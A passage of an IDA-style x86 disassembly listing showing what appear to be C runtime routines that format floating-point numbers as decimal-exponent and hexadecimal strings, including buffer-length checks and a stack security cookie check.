loc_41B9E6:                             ; CODE XREF: sub_41B997+41↑j
                                        ; sub_41B997+46↑j
                mov     edx, eax

loc_41B9E8:                             ; CODE XREF: sub_41B997+55↓j
                dec     eax
                cmp     byte ptr [eax], 30h
                jz      short loc_41B9E8
                mov     ecx, [esi+0BCh]
                mov     ecx, [ecx]
                push    ebx
                mov     bl, [eax]
                cmp     bl, [ecx]
                pop     ebx
                jnz     short loc_41B9FF
                dec     eax

loc_41B9FF:                             ; CODE XREF: sub_41B997+65↑j
                                        ; sub_41B997+70↓j
                mov     cl, [edx]
                inc     eax
                inc     edx
                mov     [eax], cl
                test    cl, cl
                jnz     short loc_41B9FF

loc_41BA09:                             ; CODE XREF: sub_41B997+3A↑j
                cmp     [ebp+var_4], 0
                pop     esi
                jz      short locret_41BA17
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

locret_41BA17:                          ; CODE XREF: sub_41B997+77↑j
                leave
                retn
sub_41B997      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41BA19      proc near               ; DATA XREF: sub_4156A4+28↑o

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                fldz
                mov     eax, [ebp+arg_0]
                fcomp   qword ptr [eax]
                fnstsw  ax
                test    ah, 41h
                jp      short loc_41BA31
                xor     eax, eax
                inc     eax
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_41BA31:                             ; CODE XREF: sub_41BA19+11↑j
                xor     eax, eax
                pop     ebp
                retn
sub_41BA19      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41BA35      proc near               ; CODE XREF: sub_41BA77+10↓p
                                        ; DATA XREF: sub_4156A4+41↑o

var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                cmp     [ebp+arg_0], 0
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                jz      short loc_41BA61
                lea     eax, [ebp+var_8]
                push    eax
                call    sub_41CF9D
                mov     ecx, [ebp+var_8]
                mov     eax, [ebp+arg_4]
                mov     [eax], ecx
                mov     ecx, [ebp+var_4]
                mov     [eax+4], ecx
                jmp     short loc_41BA72
; ---------------------------------------------------------------------------

loc_41BA61:                             ; CODE XREF: sub_41BA35+11↑j
                lea     eax, [ebp+arg_0]
                push    eax
                call    sub_41D045
                mov     eax, [ebp+arg_4]
                mov     ecx, [ebp+arg_0]
                mov     [eax], ecx

loc_41BA72:                             ; CODE XREF: sub_41BA35+2A↑j
                add     esp, 0Ch
                leave
                retn
sub_41BA35      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41BA77      proc near               ; DATA XREF: sub_4156A4+14↑o

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_41BA35
                add     esp, 10h
                pop     ebp
                retn
sub_41BA77      endp


; =============== S U B R O U T I N E =======================================


sub_41BA91      proc near               ; CODE XREF: sub_41BAD6+8A↓p
                                        ; sub_41C0A8+8C↓p ...
                mov     edi, edi
                push    esi
                mov     esi, eax
                test    edi, edi
                jz      short loc_41BAAE
                push    esi
                call    sub_4102A0
                inc     eax
                push    eax
                push    esi
                add     esi, edi
                push    esi
                call    sub_40F9F0
                add     esp, 10h

loc_41BAAE:                             ; CODE XREF: sub_41BA91+7↑j
                pop     esi
                retn
sub_41BA91      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41BAB0      proc near               ; DATA XREF: sub_4156A4+1E↑o

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0
                push    [ebp+arg_0]
                call    sub_41B924
                pop     ecx
                pop     ecx
                pop     ebp
                retn
sub_41BAB0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41BAC3      proc near               ; DATA XREF: sub_4156A4+A↑o

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0
                push    [ebp+arg_0]
                call    sub_41B997
                pop     ecx
                pop     ecx
                pop     ebp
                retn
sub_41BAC3      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41BAD6      proc near               ; CODE XREF: sub_41BC45+B9↓p
                                        ; sub_41C25A+E3↓p

var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = byte ptr  18h
arg_14          = dword ptr  1Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    ebx
                push    esi
                push    edi
                push    [ebp+arg_14]
                lea     ecx, [ebp+var_10]
                mov     ebx, eax
                call    sub_40E461
                xor     esi, esi
                cmp     ebx, esi
                jnz     short loc_41BB1F

loc_41BAF4:                             ; CODE XREF: sub_41BAD6+4C↓j
                call    sub_41090E
                push    16h

loc_41BAFB:                             ; CODE XREF: sub_41BAD6+69↓j
                pop     edi
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     [eax], edi
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_4], 0
                jz      short loc_41BB18
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41BB18:                             ; CODE XREF: sub_41BAD6+39↑j
                mov     eax, edi
                jmp     loc_41BC40
; ---------------------------------------------------------------------------

loc_41BB1F:                             ; CODE XREF: sub_41BAD6+1C↑j
                cmp     [ebp+arg_0], esi
                jbe     short loc_41BAF4
                cmp     [ebp+arg_4], esi
                jle     short loc_41BB2E
                mov     eax, [ebp+arg_4]
                jmp     short loc_41BB30
; ---------------------------------------------------------------------------

loc_41BB2E:                             ; CODE XREF: sub_41BAD6+51↑j
                xor     eax, eax

loc_41BB30:                             ; CODE XREF: sub_41BAD6+56↑j
                add     eax, 9
                cmp     [ebp+arg_0], eax
                ja      short loc_41BB41
                call    sub_41090E
                push    22h
                jmp     short loc_41BAFB
; ---------------------------------------------------------------------------

loc_41BB41:                             ; CODE XREF: sub_41BAD6+60↑j
                cmp     [ebp+arg_10], 0
                jz      short loc_41BB65
                mov     edx, [ebp+arg_C]
                xor     eax, eax
                cmp     [ebp+arg_4], esi
                setnle  al
                xor     ecx, ecx
                cmp     dword ptr [edx], 2Dh
                setz    cl
                mov     edi, eax
                add     ecx, ebx
                mov     eax, ecx
                call    sub_41BA91

loc_41BB65:                             ; CODE XREF: sub_41BAD6+6F↑j
                mov     edi, [ebp+arg_C]
                cmp     dword ptr [edi], 2Dh
                mov     esi, ebx
                jnz     short loc_41BB75
                mov     byte ptr [ebx], 2Dh
                lea     esi, [ebx+1]

loc_41BB75:                             ; CODE XREF: sub_41BAD6+97↑j
                cmp     [ebp+arg_4], 0
                jle     short loc_41BB93
                lea     eax, [esi+1]
                mov     cl, [eax]
                mov     [esi], cl
                mov     esi, eax
                mov     eax, [ebp+var_10]
                mov     eax, [eax+0BCh]
                mov     eax, [eax]
                mov     al, [eax]
                mov     [esi], al

loc_41BB93:                             ; CODE XREF: sub_41BAD6+A3↑j
                xor     eax, eax
                cmp     [ebp+arg_10], al
                setz    al
                add     eax, [ebp+arg_4]
                add     esi, eax
                cmp     [ebp+arg_0], 0FFFFFFFFh
                jnz     short loc_41BBAB
                or      ebx, 0FFFFFFFFh
                jmp     short loc_41BBB0
; ---------------------------------------------------------------------------

loc_41BBAB:                             ; CODE XREF: sub_41BAD6+CE↑j
                sub     ebx, esi
                add     ebx, [ebp+arg_0]

loc_41BBB0:                             ; CODE XREF: sub_41BAD6+D3↑j
                push    offset aE000    ; "e+000"
                push    ebx
                push    esi
                call    sub_4128F1
                add     esp, 0Ch
                xor     ebx, ebx
                test    eax, eax
                jz      short loc_41BBD2
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                call    sub_40EB2C
                add     esp, 14h

loc_41BBD2:                             ; CODE XREF: sub_41BAD6+ED↑j
                lea     ecx, [esi+2]
                cmp     [ebp+arg_8], ebx
                jz      short loc_41BBDD
                mov     byte ptr [esi], 45h

loc_41BBDD:                             ; CODE XREF: sub_41BAD6+102↑j
                mov     eax, [edi+0Ch]
                inc     esi
                cmp     byte ptr [eax], 30h
                jz      short loc_41BC14
                mov     eax, [edi+4]
                dec     eax
                jns     short loc_41BBF1
                neg     eax
                mov     byte ptr [esi], 2Dh

loc_41BBF1:                             ; CODE XREF: sub_41BAD6+114↑j
                inc     esi
                cmp     eax, 64h
                jl      short loc_41BC01
                cdq
                push    64h
                pop     edi
                idiv    edi
                add     [esi], al
                mov     eax, edx

loc_41BC01:                             ; CODE XREF: sub_41BAD6+11F↑j
                inc     esi
                cmp     eax, 0Ah
                jl      short loc_41BC11
                cdq
                push    0Ah
                pop     edi
                idiv    edi
                add     [esi], al
                mov     eax, edx

loc_41BC11:                             ; CODE XREF: sub_41BAD6+12F↑j
                add     [esi+1], al

loc_41BC14:                             ; CODE XREF: sub_41BAD6+10E↑j
                test    byte_42B578, 1
                jz      short loc_41BC31
                cmp     byte ptr [ecx], 30h
                jnz     short loc_41BC31
                push    3
                lea     eax, [ecx+1]
                push    eax
                push    ecx
                call    sub_40F9F0
                add     esp, 0Ch

loc_41BC31:                             ; CODE XREF: sub_41BAD6+145↑j
                                        ; sub_41BAD6+14A↑j
                cmp     [ebp+var_4], 0
                jz      short loc_41BC3E
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41BC3E:                             ; CODE XREF: sub_41BAD6+15F↑j
                xor     eax, eax

loc_41BC40:                             ; CODE XREF: sub_41BAD6+44↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_41BAD6      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41BC45      proc near               ; CODE XREF: sub_41BD15+16↓p
                                        ; sub_41C354+7E↓p

var_2C          = dword ptr -2Ch
var_1C          = byte ptr -1Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 2Ch
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_0]
                push    ebx
                push    esi
                push    edi
                mov     edi, [ebp+arg_4]
                push    16h
                pop     esi
                push    esi
                lea     ecx, [ebp+var_1C]
                push    ecx
                lea     ecx, [ebp+var_2C]
                push    ecx
                push    dword ptr [eax+4]
                push    dword ptr [eax]
                call    sub_41D269
                xor     ebx, ebx
                add     esp, 14h
                cmp     edi, ebx
                jnz     short loc_41BC97

loc_41BC7F:                             ; CODE XREF: sub_41BC45+57↓j
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     [eax], esi
                call    sub_40EC54
                add     esp, 14h
                mov     eax, esi
                jmp     short loc_41BD06
; ---------------------------------------------------------------------------

loc_41BC97:                             ; CODE XREF: sub_41BC45+38↑j
                mov     eax, [ebp+arg_8]
                cmp     eax, ebx
                jbe     short loc_41BC7F
                mov     esi, [ebp+arg_C]
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_41BCAB
                or      eax, 0FFFFFFFFh
                jmp     short loc_41BCBF
; ---------------------------------------------------------------------------

loc_41BCAB:                             ; CODE XREF: sub_41BC45+5F↑j
                xor     ecx, ecx
                cmp     [ebp+var_2C], 2Dh
                setz    cl
                sub     eax, ecx
                xor     ecx, ecx
                cmp     esi, ebx
                setnle  cl
                sub     eax, ecx

loc_41BCBF:                             ; CODE XREF: sub_41BC45+64↑j
                lea     ecx, [ebp+var_2C]
                push    ecx
                lea     ecx, [esi+1]
                push    ecx
                push    eax
                xor     eax, eax
                cmp     [ebp+var_2C], 2Dh
                setz    al
                xor     ecx, ecx
                cmp     esi, ebx
                setnle  cl
                add     eax, edi
                add     ecx, eax
                push    ecx
                call    sub_41D0ED
                add     esp, 10h
                cmp     eax, ebx
                jz      short loc_41BCED
                mov     [edi], bl
                jmp     short loc_41BD06
; ---------------------------------------------------------------------------

loc_41BCED:                             ; CODE XREF: sub_41BC45+A2↑j
                push    [ebp+arg_14]
                lea     eax, [ebp+var_2C]
                push    ebx
                push    eax
                push    [ebp+arg_10]
                mov     eax, edi
                push    esi
                push    [ebp+arg_8]
                call    sub_41BAD6
                add     esp, 18h

loc_41BD06:                             ; CODE XREF: sub_41BC45+50↑j
                                        ; sub_41BC45+A6↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_41BC45      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41BD15      proc near               ; CODE XREF: sub_41BD35+BF↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0
                push    [ebp+arg_10]
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_41BC45
                add     esp, 18h
                pop     ebp
                retn
sub_41BD15      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41BD35      proc near               ; CODE XREF: sub_41C354+65↓p

var_24          = dword ptr -24h
var_1C          = dword ptr -1Ch
var_18          = byte ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 24h
                push    esi
                push    edi
                push    [ebp+arg_14]
                lea     ecx, [ebp+var_24]
                mov     [ebp+var_14], 3FFh
                xor     edi, edi
                mov     [ebp+var_4], 30h
                call    sub_40E461
                cmp     [ebp+arg_C], edi
                jge     short loc_41BD62
                mov     [ebp+arg_C], edi

loc_41BD62:                             ; CODE XREF: sub_41BD35+28↑j
                mov     esi, [ebp+arg_4]
                cmp     esi, edi
                jnz     short loc_41BD94

loc_41BD69:                             ; CODE XREF: sub_41BD35+62↓j
                call    sub_41090E
                push    16h

loc_41BD70:                             ; CODE XREF: sub_41BD35+79↓j
                pop     esi
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                mov     [eax], esi
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_18], 0
                jz      short loc_41BD8D
                mov     eax, [ebp+var_1C]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41BD8D:                             ; CODE XREF: sub_41BD35+4F↑j
                mov     eax, esi
                jmp     loc_41C0A4
; ---------------------------------------------------------------------------

loc_41BD94:                             ; CODE XREF: sub_41BD35+32↑j
                cmp     [ebp+arg_8], edi
                jbe     short loc_41BD69
                mov     eax, [ebp+arg_C]
                add     eax, 0Bh
                mov     byte ptr [esi], 0
                cmp     [ebp+arg_8], eax
                ja      short loc_41BDB0
                call    sub_41090E
                push    22h
                jmp     short loc_41BD70
; ---------------------------------------------------------------------------

loc_41BDB0:                             ; CODE XREF: sub_41BD35+70↑j
                mov     edi, [ebp+arg_0]
                mov     eax, [edi]
                mov     [ebp+var_C], eax
                mov     eax, [edi+4]
                mov     ecx, eax
                shr     ecx, 14h
                mov     edx, 7FFh
                push    ebx
                and     ecx, edx
                xor     ebx, ebx
                cmp     ecx, edx
                jnz     loc_41BE62
                test    ebx, ebx
                jnz     loc_41BE62
                mov     eax, [ebp+arg_8]
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_41BDE6
                or      eax, eax
                jmp     short loc_41BDE9
; ---------------------------------------------------------------------------

loc_41BDE6:                             ; CODE XREF: sub_41BD35+AB↑j
                add     eax, 0FFFFFFFEh

loc_41BDE9:                             ; CODE XREF: sub_41BD35+AF↑j
                push    0
                push    [ebp+arg_C]
                lea     ebx, [esi+2]
                push    eax
                push    ebx
                push    edi
                call    sub_41BD15
                add     esp, 14h
                test    eax, eax
                jz      short loc_41BE19
                cmp     [ebp+var_18], 0
                mov     byte ptr [esi], 0
                jz      loc_41C0A3
                mov     ecx, [ebp+var_1C]
                and     dword ptr [ecx+70h], 0FFFFFFFDh
                jmp     loc_41C0A3
; ---------------------------------------------------------------------------

loc_41BE19:                             ; CODE XREF: sub_41BD35+C9↑j
                cmp     byte ptr [ebx], 2Dh
                jnz     short loc_41BE22
                mov     byte ptr [esi], 2Dh
                inc     esi

loc_41BE22:                             ; CODE XREF: sub_41BD35+E7↑j
                mov     byte ptr [esi], 30h
                inc     esi
                cmp     [ebp+arg_10], 0
                push    65h
                setz    al
                dec     al
                and     al, 0E0h
                add     al, 78h
                mov     [esi], al
                inc     esi
                push    esi
                call    sub_41CF70
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      loc_41C094
                cmp     [ebp+arg_10], 0
                setz    cl
                dec     cl
                and     cl, 0E0h
                add     cl, 70h
                mov     [eax], cl
                mov     byte ptr [eax+3], 0
                jmp     loc_41C094
; ---------------------------------------------------------------------------

loc_41BE62:                             ; CODE XREF: sub_41BD35+97↑j
                                        ; sub_41BD35+9F↑j
                and     eax, 80000000h
                xor     ecx, ecx
                or      ecx, eax
                jz      short loc_41BE71
                mov     byte ptr [esi], 2Dh
                inc     esi

loc_41BE71:                             ; CODE XREF: sub_41BD35+136↑j
                mov     ebx, [ebp+arg_10]
                mov     byte ptr [esi], 30h
                inc     esi
                test    ebx, ebx
                setz    al
                dec     al
                and     al, 0E0h
                add     al, 78h
                mov     [esi], al
                mov     ecx, [edi+4]
                inc     esi
                neg     ebx
                sbb     ebx, ebx
                and     ebx, 0FFFFFFE0h
                and     ecx, 7FF00000h
                xor     eax, eax
                add     ebx, 27h
                xor     edx, edx
                or      eax, ecx
                jnz     short loc_41BEC2
                mov     byte ptr [esi], 30h
                mov     ecx, [edi+4]
                mov     eax, [edi]
                and     ecx, 0FFFFFh
                inc     esi
                or      eax, ecx
                jnz     short loc_41BEB9
                mov     [ebp+var_14], edx
                jmp     short loc_41BEC6
; ---------------------------------------------------------------------------

loc_41BEB9:                             ; CODE XREF: sub_41BD35+17D↑j
                mov     [ebp+var_14], 3FEh
                jmp     short loc_41BEC6
; ---------------------------------------------------------------------------

loc_41BEC2:                             ; CODE XREF: sub_41BD35+16A↑j
                mov     byte ptr [esi], 31h
                inc     esi

loc_41BEC6:                             ; CODE XREF: sub_41BD35+182↑j
                                        ; sub_41BD35+18B↑j
                mov     eax, esi
                inc     esi
                mov     [ebp+arg_4], eax
                cmp     [ebp+arg_C], edx
                jnz     short loc_41BED5
                mov     [eax], dl
                jmp     short loc_41BEE4
; ---------------------------------------------------------------------------

loc_41BED5:                             ; CODE XREF: sub_41BD35+19A↑j
                mov     ecx, [ebp+var_24]
                mov     ecx, [ecx+0BCh]
                mov     ecx, [ecx]
                mov     cl, [ecx]
                mov     [eax], cl

loc_41BEE4:                             ; CODE XREF: sub_41BD35+19E↑j
                mov     ecx, [edi+4]
                mov     eax, [edi]
                and     ecx, 0FFFFFh
                mov     [ebp+var_8], ecx
                ja      short loc_41BEFC
                cmp     eax, edx
                jbe     loc_41BFB1

loc_41BEFC:                             ; CODE XREF: sub_41BD35+1BD↑j
                mov     [ebp+var_C], edx
                mov     [ebp+var_8], 0F0000h

loc_41BF06:                             ; CODE XREF: sub_41BD35+222↓j
                cmp     [ebp+arg_C], 0
                jle     short loc_41BF59
                mov     edx, [edi+4]
                and     edx, [ebp+var_8]
                mov     eax, [edi]
                movsx   ecx, word ptr [ebp+var_4]
                and     eax, [ebp+var_C]
                and     edx, 0FFFFFh
                call    sub_41D3E0
                add     ax, 30h
                movzx   eax, ax
                cmp     ax, 39h
                jbe     short loc_41BF35
                add     eax, ebx

loc_41BF35:                             ; CODE XREF: sub_41BD35+1FC↑j
                mov     ecx, [ebp+var_8]
                sub     [ebp+var_4], 4
                mov     [esi], al
                mov     eax, [ebp+var_C]
                shrd    eax, ecx, 4
                shr     ecx, 4
                inc     esi
                dec     [ebp+arg_C]
                cmp     word ptr [ebp+var_4], 0
                mov     [ebp+var_C], eax
                mov     [ebp+var_8], ecx
                jge     short loc_41BF06

loc_41BF59:                             ; CODE XREF: sub_41BD35+1D5↑j
                cmp     word ptr [ebp+var_4], 0
                jl      short loc_41BFB1
                mov     edx, [edi+4]
                and     edx, [ebp+var_8]
                mov     eax, [edi]
                movsx   ecx, word ptr [ebp+var_4]
                and     eax, [ebp+var_C]
                and     edx, 0FFFFFh
                call    sub_41D3E0
                cmp     ax, 8
                jbe     short loc_41BFB1
                lea     eax, [esi-1]

loc_41BF83:                             ; CODE XREF: sub_41BD35+25E↓j
                mov     cl, [eax]
                cmp     cl, 66h
                jz      short loc_41BF8F
                cmp     cl, 46h
                jnz     short loc_41BF95

loc_41BF8F:                             ; CODE XREF: sub_41BD35+253↑j
                mov     byte ptr [eax], 30h
                dec     eax
                jmp     short loc_41BF83
; ---------------------------------------------------------------------------

loc_41BF95:                             ; CODE XREF: sub_41BD35+258↑j
                cmp     eax, [ebp+arg_4]
                jz      short loc_41BFAE
                mov     cl, [eax]
                cmp     cl, 39h
                jnz     short loc_41BFA8
                add     bl, 3Ah
                mov     [eax], bl
                jmp     short loc_41BFB1
; ---------------------------------------------------------------------------

loc_41BFA8:                             ; CODE XREF: sub_41BD35+26A↑j
                inc     cl
                mov     [eax], cl
                jmp     short loc_41BFB1
; ---------------------------------------------------------------------------

loc_41BFAE:                             ; CODE XREF: sub_41BD35+263↑j
                inc     byte ptr [eax-1]

loc_41BFB1:                             ; CODE XREF: sub_41BD35+1C1↑j
                                        ; sub_41BD35+229↑j ...
                cmp     [ebp+arg_C], 0
                jle     short loc_41BFC8
                push    [ebp+arg_C]
                push    30h
                push    esi
                call    sub_413520
                add     esp, 0Ch
                add     esi, [ebp+arg_C]

loc_41BFC8:                             ; CODE XREF: sub_41BD35+280↑j
                mov     eax, [ebp+arg_4]
                cmp     byte ptr [eax], 0
                jnz     short loc_41BFD2
                mov     esi, eax

loc_41BFD2:                             ; CODE XREF: sub_41BD35+299↑j
                cmp     [ebp+arg_10], 0
                mov     cl, 34h
                setz    al
                dec     al
                and     al, 0E0h
                add     al, 70h
                mov     [esi], al
                mov     eax, [edi]
                mov     edx, [edi+4]
                inc     esi
                call    sub_41D3E0
                xor     ebx, ebx
                and     eax, 7FFh
                and     edx, ebx
                sub     eax, [ebp+var_14]
                push    ebx
                pop     ecx
                sbb     edx, ecx
                js      short loc_41C00C
                jg      short loc_41C006
                cmp     eax, ebx
                jb      short loc_41C00C

loc_41C006:                             ; CODE XREF: sub_41BD35+2CB↑j
                mov     byte ptr [esi], 2Bh
                inc     esi
                jmp     short loc_41C016
; ---------------------------------------------------------------------------

loc_41C00C:                             ; CODE XREF: sub_41BD35+2C9↑j
                                        ; sub_41BD35+2CF↑j
                mov     byte ptr [esi], 2Dh
                inc     esi
                neg     eax
                adc     edx, ebx
                neg     edx

loc_41C016:                             ; CODE XREF: sub_41BD35+2D5↑j
                cmp     edx, ebx
                mov     edi, esi
                mov     byte ptr [esi], 30h
                jl      short loc_41C043
                mov     ecx, 3E8h
                jg      short loc_41C02A
                cmp     eax, ecx
                jb      short loc_41C043

loc_41C02A:                             ; CODE XREF: sub_41BD35+2EF↑j
                push    ebx
                push    ecx
                push    edx
                push    eax
                call    sub_41D300
                add     al, 30h
                mov     [esi], al
                inc     esi
                mov     [ebp+var_10], edx
                mov     eax, ecx
                mov     edx, ebx
                cmp     esi, edi
                jnz     short loc_41C04E

loc_41C043:                             ; CODE XREF: sub_41BD35+2E8↑j
                                        ; sub_41BD35+2F3↑j
                test    edx, edx
                jl      short loc_41C065
                jg      short loc_41C04E
                cmp     eax, 64h
                jb      short loc_41C065

loc_41C04E:                             ; CODE XREF: sub_41BD35+30C↑j
                                        ; sub_41BD35+312↑j
                push    0
                push    64h
                push    edx
                push    eax
                call    sub_41D300
                add     al, 30h
                mov     [esi], al
                mov     [ebp+var_10], edx
                inc     esi
                mov     eax, ecx
                mov     edx, ebx

loc_41C065:                             ; CODE XREF: sub_41BD35+310↑j
                                        ; sub_41BD35+317↑j
                cmp     esi, edi
                jnz     short loc_41C074
                test    edx, edx
                jl      short loc_41C08C
                jg      short loc_41C074
                cmp     eax, 0Ah
                jb      short loc_41C08C

loc_41C074:                             ; CODE XREF: sub_41BD35+332↑j
                                        ; sub_41BD35+338↑j
                push    0
                push    0Ah
                push    edx
                push    eax
                call    sub_41D300
                add     al, 30h
                mov     [esi], al
                mov     [ebp+var_10], edx
                inc     esi
                mov     eax, ecx
                mov     [ebp+var_10], ebx

loc_41C08C:                             ; CODE XREF: sub_41BD35+336↑j
                                        ; sub_41BD35+33D↑j
                add     al, 30h
                mov     [esi], al
                mov     byte ptr [esi+1], 0

loc_41C094:                             ; CODE XREF: sub_41BD35+10D↑j
                                        ; sub_41BD35+128↑j
                cmp     [ebp+var_18], 0
                jz      short loc_41C0A1
                mov     eax, [ebp+var_1C]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41C0A1:                             ; CODE XREF: sub_41BD35+363↑j
                xor     eax, eax

loc_41C0A3:                             ; CODE XREF: sub_41BD35+D2↑j
                                        ; sub_41BD35+DF↑j
                pop     ebx

loc_41C0A4:                             ; CODE XREF: sub_41BD35+5A↑j
                pop     edi
                pop     esi
                leave
                retn
sub_41BD35      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41C0A8      proc near               ; CODE XREF: sub_41C19F+A4↓p
                                        ; sub_41C25A+C5↓p

var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = byte ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    ebx
                push    esi
                push    edi
                push    [ebp+arg_C]
                mov     ebx, eax
                mov     esi, [ebx+4]
                mov     edi, ecx
                lea     ecx, [ebp+var_10]
                dec     esi
                call    sub_40E461
                test    edi, edi
                jnz     short loc_41C0F7

loc_41C0CA:                             ; CODE XREF: sub_41C0A8+53↓j
                call    sub_41090E
                push    16h
                pop     esi
                mov     [eax], esi
                xor     eax, eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_4], 0
                jz      short loc_41C0F0
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41C0F0:                             ; CODE XREF: sub_41C0A8+3F↑j
                mov     eax, esi
                jmp     loc_41C19A
; ---------------------------------------------------------------------------

loc_41C0F7:                             ; CODE XREF: sub_41C0A8+20↑j
                cmp     [ebp+arg_0], 0
                jbe     short loc_41C0CA
                cmp     [ebp+arg_8], 0
                jz      short loc_41C11B
                cmp     esi, [ebp+arg_4]
                jnz     short loc_41C11B
                xor     eax, eax
                cmp     dword ptr [ebx], 2Dh
                setz    al
                add     eax, esi
                add     eax, edi
                mov     byte ptr [eax], 30h
                mov     byte ptr [eax+1], 0

loc_41C11B:                             ; CODE XREF: sub_41C0A8+59↑j
                                        ; sub_41C0A8+5E↑j
                cmp     dword ptr [ebx], 2Dh
                mov     esi, edi
                jnz     short loc_41C128
                mov     byte ptr [edi], 2Dh
                lea     esi, [edi+1]

loc_41C128:                             ; CODE XREF: sub_41C0A8+78↑j
                mov     eax, [ebx+4]
                xor     edi, edi
                inc     edi
                test    eax, eax
                jg      short loc_41C13F
                mov     eax, esi
                call    sub_41BA91
                mov     byte ptr [esi], 30h
                inc     esi
                jmp     short loc_41C141
; ---------------------------------------------------------------------------

loc_41C13F:                             ; CODE XREF: sub_41C0A8+88↑j
                add     esi, eax

loc_41C141:                             ; CODE XREF: sub_41C0A8+95↑j
                cmp     [ebp+arg_4], 0
                jle     short loc_41C18B
                mov     eax, esi
                call    sub_41BA91
                mov     eax, [ebp+var_10]
                mov     eax, [eax+0BCh]
                mov     eax, [eax]
                mov     al, [eax]
                mov     [esi], al
                mov     ebx, [ebx+4]
                inc     esi
                test    ebx, ebx
                jge     short loc_41C18B
                neg     ebx
                cmp     [ebp+arg_8], 0
                jnz     short loc_41C172
                cmp     [ebp+arg_4], ebx
                jl      short loc_41C175

loc_41C172:                             ; CODE XREF: sub_41C0A8+C3↑j
                mov     [ebp+arg_4], ebx

loc_41C175:                             ; CODE XREF: sub_41C0A8+C8↑j
                mov     edi, [ebp+arg_4]
                mov     eax, esi
                call    sub_41BA91
                push    edi
                push    30h
                push    esi
                call    sub_413520
                add     esp, 0Ch

loc_41C18B:                             ; CODE XREF: sub_41C0A8+9D↑j
                                        ; sub_41C0A8+BB↑j
                cmp     [ebp+var_4], 0
                jz      short loc_41C198
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_41C198:                             ; CODE XREF: sub_41C0A8+E7↑j
                xor     eax, eax

loc_41C19A:                             ; CODE XREF: sub_41C0A8+4A↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_41C0A8      endp


